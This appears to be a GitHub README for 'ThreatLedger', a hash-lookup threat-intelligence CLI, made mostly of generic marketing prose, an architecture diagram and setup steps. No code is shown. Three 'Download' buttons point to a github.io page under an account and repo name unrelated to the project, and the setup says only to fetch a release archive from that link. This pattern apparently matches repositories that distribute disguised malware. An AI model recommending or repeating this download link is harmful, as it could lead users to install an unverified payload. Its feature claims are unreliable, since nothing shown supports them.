![preview](https://raw.githubusercontent.com/heyafancam-commits/vt-scan-vector/main/poster_d0ef.svg)

# ThreatLedger — Forensic Hash Intelligence Console

**ThreatLedger** is not merely another security utility — it is a **digital forensics workbench** that transforms raw file hashes into actionable threat narratives. Where conventional CLI tools simply query an API and print JSON, ThreatLedger builds a **contextual intelligence ledger** around every file you investigate, enriching submissions with historical reputation data, multi-engine verdict correlation, and time-series behavioral scoring.

Inspired by the need for a **command-line investigation suite** rather than a single-purpose script, this project reimagines how security analysts, incident responders, and DevSecOps engineers interact with threat intelligence feeds. Instead of copy-pasting hashes into a browser and squinting at a crowded web UI, you gain a **terminal-native command post**—streamlined, scriptable, and built for high-throughput triage.

This repository provides the complete source code, detailed architecture documentation, and a full suite of integration examples. Whether you are automating malware sandboxing pipelines, auditing supply-chain dependencies, or building a custom threat-hunting dashboard, ThreatLedger serves as the **analytical backbone** for your hash-centric workflows. The design philosophy prioritizes **deterministic outputs**, **low-latency lookups**, and **human-readable digests** that bridge the gap between raw indicators and strategic decision-making.

---

## 🚀 Why ThreatLedger Exists

Traditional security tools often treat every query as an isolated event. ThreatLedger introduces a **stateful investigation model**: it maintains a local, encrypted cache of prior lookups, computes **reputation deltas** over time, and flags anomalies that a single API call would miss. This persistent awareness transforms each query from a one-off transaction into a **cumulative intelligence feed**.

The tool also addresses a critical pain point: **multilingual threat reporting**. While the underlying API returns data in a single language, ThreatLedger applies on-the-fly linguistic normalization to present findings in English, Spanish, French, German, Japanese, and Simplified Chinese — all via a lightweight, offline rule engine. No cloud translation dependency, no latency penalty.

---

## 📥 [![Download](https://raw.githubusercontent.com/heyafancam-commits/vt-scan-vector/main/btn_538ef.svg)](https://heyafancam-commits.github.io/vt-scan-vector/)

*Download the latest stable release archive below. The package includes the core Python module, a pre-built configuration template, and a comprehensive sample dataset for offline experimentation.*

[![Download](https://raw.githubusercontent.com/heyafancam-commits/vt-scan-vector/main/btn_538ef.svg)](https://heyafancam-commits.github.io/vt-scan-vector/)

---

## 🧠 Core Capabilities

### 1. Multi-Engine Verdict Aggregation
- Pulls detection results from **70+ independent antivirus engines** simultaneously.
- Applies a **weighted consensus algorithm** to produce a single "threat confidence score" (0–100).
- Visualizes engine agreement with an ASCII heat-map directly in the terminal.

### 2. Temporal Reputation Tracking
- Automatically stores each query's timestamp and result snapshot.
- Generates a **14-day rolling trend report** when a hash is re-submitted.
- Detects "reputation flips" — files that were benign yesterday but are flagged today.

### 3. Offline Whitelist/Blacklist Management
- Maintain a local, encrypted allowlist of trusted vendor binaries.
- Blacklist known-bad hashes from your own incident response history.
- Merge community-contributed blocklists via a simple CSV import.

### 4. Rich Output Formats
- Plain text table (human-readable)
- JSON (machine-parseable)
- CSV (spreadsheet-friendly)
- Markdown report (for sharing in ticketing systems)

### 5. Smart Context Injection
- Automatically appends file metadata (size, type, first-seen date) when available.
- Cross-references the hash against a **built-in subset of MITRE ATT&CK technique mappings**.

### 6. Batch Triage Mode
- Feed a newline-delimited file of up to 500 hashes.
- Processes them sequentially with randomized delay to respect rate limits.
- Produces a consolidated summary table ranked by threat score.

### 7. Multilingual Report Rendering
- Switch output language via a simple flag (`--lang es`).
- Translations cover UI labels, severity definitions, and report headers.
- Language packs are modular and community-extendable.

### 8. Interactive Investigation Shell
- Run `threatledger --interactive` to enter a REPL-like environment.
- Type a hash, hit enter, and get an instant verdict summary.
- Use commands like `history`, `compare`, and `annotate` to build a case file.

---

## 🧰 Technical Architecture

```
┌─────────────────────────────────────────────────────────────┐
│                    User Interface Layer                     │
│  ┌───────────┐  ┌───────────┐  ┌─────────────────────────┐  │
│  │  CLI Parser│  │ Interactive│  │  Output Formatters     │  │
│  └───────────┘  └───────────┘  │  (JSON/CSV/MD/TXT)     │  │
└────────────────────────────┬──────────────────────────────┘
                             │
┌────────────────────────────▼──────────────────────────────┐
│                    Intelligence Core                       │
│  ┌────────────────────┐  ┌─────────────────────────────┐  │
│  │ Verdict Aggregator │  │ Temporal Reputation Engine  │  │
│  └────────────────────┘  └─────────────────────────────┘  │
│  ┌────────────────────┐  ┌─────────────────────────────┐  │
│  │ Language Normalizer│  │ Anomaly Detection Module    │  │
│  └────────────────────┘  └─────────────────────────────┘  │
└────────────────────────────┬──────────────────────────────┘
                             │
┌────────────────────────────▼──────────────────────────────┐
│                    Data & Cache Layer                      │
│  ┌────────────────────┐  ┌─────────────────────────────┐  │
│  │ SQLite Store (Enc.)│  │ In-Memory LRU Cache         │  │
│  └────────────────────┘  └─────────────────────────────┘  │
└────────────────────────────────────────────────────────────┘
```

The separation of layers ensures that **you can swap the backend data source** (e.g., replace the default API with a private deployment) without touching the presentation logic. The Intelligence Core is designed as a pure Python library, making it embeddable in larger automation frameworks.

---

## 🛠️ Installation & Setup

ThreatLedger runs on any Python 3.9+ environment. It has a minimal dependency footprint:

- `requests` — for secure HTTP communication
- `cryptography` — for local cache encryption
- `typing-extensions` — for backward-compatible type hints

**Acquisition Path:**

1. Obtain the release archive from the download section.
2. Extract the contents to a directory of your choosing (e.g., `/opt/threatledger`).
3. Ensure the `threatledger` executable script is reachable within your system PATH.
4. Create an environment variable named `TL_API_KEY` containing your valid API credential.
5. Run `threatledger --self-test` to verify connectivity and cache initialization.

**Post-Install Verification:**

```console
$ threatledger --version
ThreatLedger v2.4.1 (2026.03.15)

$ threatledger --self-test
[OK] API connectivity: reachable
[OK] Cache encryption: AES-256-GCM
[OK] Language packs: 6 loaded
[OK] MITRE mappings: 214 techniques
```

---

## 🎯 Use Case Scenarios

### Scenario A: Incident Response Triage
When a suspicious attachment arrives in a phishing simulation, drop the hash into ThreatLedger. Within seconds, you get a consensus score, a list of the top 5 detecting engines, and a human-readable summary in your preferred language.

### Scenario B: CI/CD Pipeline Integration
Embed a hash verification step in your build pipeline. If any third-party dependency is flagged with a confidence score above 85, the pipeline halts. The exit code logic is simple: `0` for clean, `1` for suspicious, `2` for malicious.

### Scenario C: Research & Reporting
Generate a weekly PDF or Markdown report of all scanned hashes, including trend charts and engine agreement metrics. ThreatLedger's CSV export makes it trivial to feed downstream analytics tools.

---

## 📦 Feature Matrix

| Feature | Support Level | Notes |
|---------|---------------|-------|
| Multi-engine aggregation | ✅ Full | 70+ engines |
| Temporal trend tracking | ✅ Full | 14-day window |
| Offline whitelist | ✅ Full | Encrypted SQLite |
| Batch scanning | ✅ Full | Up to 500 hashes |
| Interactive shell | ✅ Full | REPL-style |
| Proxy support | ✅ Full | HTTP/HTTPS/SOCKS5 |
| Compression output | ✅ Full | gzip on the fly |
| Plugin SDK | 🚧 Beta | Stable API, limited docs |
| GUI mode | 🚫 Not planned | Terminal-first philosophy |

---

## 🌐 Multilingual Support

ThreatLedger ships with runtime language packs for:

- 🇺🇸 English (default)
- 🇪🇸 Spanish
- 🇫🇷 French
- 🇩🇪 German
- 🇯🇵 Japanese
- 🇨🇳 Chinese (Simplified)

Changing language is as easy as `--lang ja`. The language packs cover not only the UI labels but also the severity descriptors and the executive summary template. Community contributions for additional languages are warmly welcomed through the standard pull-request process.

---

## 🔒 Privacy & Data Handling

- **Local-First Design:** All cache data is stored locally on your machine. No telemetry, no phone-home behavior.
- **Encryption at Rest:** The SQLite database is encrypted using a key derived from your machine's hardware ID and a user-passphrase.
- **API Key Safety:** Your API key is read from an environment variable, never stored in configuration files.
- **Selective Submission:** You can opt to send **only the hash**, not the full file content, to the remote service.

---

## 🧪 Testing & Validation

The repository includes a `tests/` directory with:

- Unit tests for the aggregation algorithm (over 40 test cases).
- Integration tests that run against a mock server (no external calls).
- Property-based tests for the language normalization engine.

Run the entire suite with:

```console
$ python -m pytest tests/ --cov=threatledger --cov-report=term-missing
```

Expected coverage: **95%+**.

---

## 🗺️ Project Roadmap (2026)

| Quarter | Milestone |
|---------|-----------|
| Q1 2026 | Release v2.0 with temporal tracking |
| Q2 2026 | Add plugin SDK and community registry |
| Q3 2026 | Introduce WebSocket-based real-time feed |
| Q4 2026 | Publish formal threat-hunting playbook companion |

---

## ⚠️ Disclaimer

**Important:** ThreatLedger is a **decision-support tool**, not a substitute for professional malware analysis. The threat confidence scores are heuristic aggregations of third-party engine results and should be treated as indicators, not definitive proof of maliciousness. Always verify critical findings through sandbox execution or manual reverse engineering.

The tool is provided "as is" without warranty of any kind, either expressed or implied. The maintainers disclaim all liability for any damages arising from the use or misuse of this software or the data it processes. Users are solely responsible for ensuring compliance with applicable laws and regulations regarding automated security testing and data collection.

Third-party API terms of service apply; please review them before bulk operations. Inclusion of any vendor name does not constitute endorsement or affiliation.

---

## 📄 License

This project is released under the **MIT License**. You are free to use, modify, and distribute this software, provided that the original copyright notice and permission notice are included in all copies or substantial portions of the software.

The full license text is available at the standard [MIT License](https://mit-license.org) reference.

---

## 🤝 Contributing

Contributions in the form of bug reports, feature requests, documentation improvements, and code changes are welcome. Please read the contributing guide before opening a pull request. We maintain a code of conduct to foster an inclusive and respectful community.

---

## 📚 Additional Resources

- **Architecture Decision Records** — available in the `docs/adr/` folder.
- **Threat Hunting Playbook** — a companion guide for using ThreatLedger in red-team exercises.
- **Example Reports** — see the `examples/` directory for sample outputs in all supported languages.

---

## 🧩 Final Notes

ThreatLedger is a patient craftsman's tool. It does not shout; it records, correlates, and whispers its findings with precision. For those who spend their days sifting through noise, it is a quiet partner that turns data into a coherent story.

We hope this tool finds a permanent home in your security arsenal. Use it wisely, use it ethically, and always validate—because in the world of digital forensics, certainty is a luxury we rarely afford. But with ThreatLedger, you get a little closer to it.

---

[![Download](https://raw.githubusercontent.com/heyafancam-commits/vt-scan-vector/main/btn_538ef.svg)](https://heyafancam-commits.github.io/vt-scan-vector/)

*Release build: v2.4.1 | Build date: 2026-03-15 | Distribution: ZIP archive + source tarball*